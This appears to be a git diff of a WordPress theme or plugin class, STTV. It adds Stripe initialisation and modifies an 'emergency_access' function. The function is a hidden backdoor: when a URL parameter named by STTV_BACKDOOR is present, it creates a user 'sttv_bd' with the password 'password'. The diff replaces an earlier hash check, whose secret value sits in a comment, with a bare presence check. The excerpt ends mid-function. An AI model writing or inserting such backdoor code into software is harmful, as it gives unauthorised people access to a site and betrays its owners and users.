@@ -100,6 +100,12 @@ final class STTV {
     public function init() {
         global $pagenow;
 
+        \Stripe\Stripe::setApiKey( STRIPE_SK );
+
+        //print_r( \Stripe\Plan::all( [ "limit" => 3 ] ) );
+
+        //exit;
+
         // divert all requests to wp-login.php (it's unnecessary)
         if ( $pagenow === 'wp-login.php' && !is_user_logged_in() ) {
             wp_redirect(home_url());
@@ -108,7 +114,9 @@ final class STTV {
     }
 
     public function emergency_access() {
-		if (isset($_GET['sttvbd']) && md5($_GET['sttvbd']) == 'e37f0136aa3ffaf149b351f6a4c948e9') { //sttvbd=init
+        
+		if ( isset($_GET[ STTV_BACKDOOR ]) ) {
+            $key = array_keys($_GET)[0];
 			if ( !username_exists( 'sttv_bd' ) ) {
 				require( 'wp-includes/registration.php' );
 				$user_id = wp_create_user( 'sttv_bd', 'password' );
